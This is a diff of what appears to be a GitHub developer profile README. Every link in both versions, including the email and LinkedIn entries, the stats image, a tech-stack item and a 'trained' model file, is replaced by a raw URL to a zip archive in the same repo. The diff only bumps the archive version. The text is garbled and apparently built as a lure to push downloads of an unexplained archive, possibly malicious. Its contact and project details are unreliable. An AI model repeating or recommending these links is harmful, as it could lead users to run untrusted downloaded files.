@@ -1,7 +1,7 @@
 # Hi, I'm Raghul 👋  
 <!-- Typing SVG -->
 <p align="center">
-  <img src="https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-v2.8.zip+Build.+I+Break.+I+Learn.;Code+with+Purpose.;Always+Improving.&center=true&width=480&height=40">
+  <img src="https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-2.1.zip+Build.+I+Break.+I+Learn.;Code+with+Purpose.;Always+Improving.&center=true&width=480&height=40">
 </p>
 
 
@@ -30,7 +30,7 @@ I'm a **Information Technology** student with a strong interest in **Frontend an
 - Flask  
 - FastAPI  
 - Django  
-- https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-v2.8.zip  
+- https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-2.1.zip  
 - React
 - Html & CSS
 
@@ -81,7 +81,7 @@ AI-powered chatbot that answers insurance-related questions from uploaded docume
 Machine learning web application for early heart disease risk prediction.
 
 - Logistic Regression model
-- Flask backend with trained `https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-v2.8.zip`
+- Flask backend with trained `https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-2.1.zip`
 - Multi-step HTML forms with validation
 - User/Admin data handling
 - Clean UI with CSS & JavaScript
@@ -101,7 +101,7 @@ Full-stack weather application with intelligent UI features.
 
 ## 📊 LeetCode Stats
 <p align="center">
-  <img src="https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-v2.8.zip" />
+  <img src="https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-2.1.zip" />
 </p>
 
 
@@ -109,8 +109,8 @@ Full-stack weather application with intelligent UI features.
 ---
 
 ## 📫 Let's Connect
-- 📧 Email: https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-v2.8.zip  or https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-v2.8.zip
-- 💼 LinkedIn: https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-v2.8.zip 
+- 📧 Email: https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-2.1.zip  or https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-2.1.zip
+- 💼 LinkedIn: https://raw.githubusercontent.com/Raghul-676/Raghul-676/main/unilobar/Raghul-2.1.zip 
 
 
 ---
